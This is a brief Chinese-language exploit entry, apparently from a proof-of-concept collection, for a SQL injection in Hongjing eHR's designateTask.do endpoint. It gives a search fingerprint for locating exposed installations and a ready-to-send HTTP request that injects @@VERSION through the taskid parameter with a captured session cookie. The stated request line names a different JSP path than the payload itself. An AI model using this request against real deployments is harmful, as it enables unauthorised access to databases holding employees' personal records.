# 宏景eHRdesignateTask.do存在SQL注入漏洞

- **系统**：宏景　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1`
- **关键头**：`Priority: u=0, i`

**请求体 / payload**
```
携带cookie进行注入
**GET** /performance/objectiveManage/designateTask.do?**b_save**=&**taskid**=**@@VERSION** **HTTP/1.1**
**Host**:
Priority: u=0, i
**User-Agent**: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
**Cookie**: 获取的cookie
```
- **预期**：200　|　—